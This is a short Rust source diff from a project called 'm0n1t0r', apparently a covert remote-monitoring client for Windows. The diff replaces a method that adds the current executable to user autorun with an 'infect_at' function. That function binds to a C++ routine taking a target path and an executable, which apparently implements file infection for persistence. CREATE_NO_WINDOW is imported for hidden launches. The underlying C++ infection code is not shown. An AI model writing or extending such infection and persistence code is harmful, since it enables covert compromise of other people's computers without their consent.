@@ -1,7 +1,7 @@
 use m0n1t0r_common::{Error, Result as AppResult};
 use remoc::rtc;
-use std::{env, path::PathBuf};
-use tokio::process::Command;
+use std::{path::PathBuf, thread};
+use tokio::{process::Command, sync::oneshot};
 use winapi::um::winbase::CREATE_NO_WINDOW;
 
 pub struct AgentObj {}
@@ -41,8 +41,27 @@ impl m0n1t0r_common::autorun::Agent for AgentObj {
         Ok(())
     }
 
-    async fn add_current_user(&self) -> AppResult<()> {
-        self.add_current_user_at(env::current_exe()?.to_path_buf())
-            .await
+    async fn infect_at(&self, target: PathBuf, exe: PathBuf) -> AppResult<bool> {
+        let (tx, rx) = oneshot::channel();
+
+        thread::spawn(move || {
+            let _ = tx.send(ffi::infect_at(
+                target.to_string_lossy().to_string(),
+                exe.to_string_lossy().to_string(),
+            )?);
+            Ok::<_, anyhow::Error>(())
+        });
+        Ok(rx.await?.into())
+    }
+}
+
+#[cxx::bridge]
+mod ffi {
+    extern "Rust" {}
+
+    unsafe extern "C++" {
+        include!("m0n1t0r-client/m0n1t0r-cpp-windows-lib/include/autorun.h");
+
+        fn infect_at(target: String, exe: String) -> Result<bool>;
     }
 }
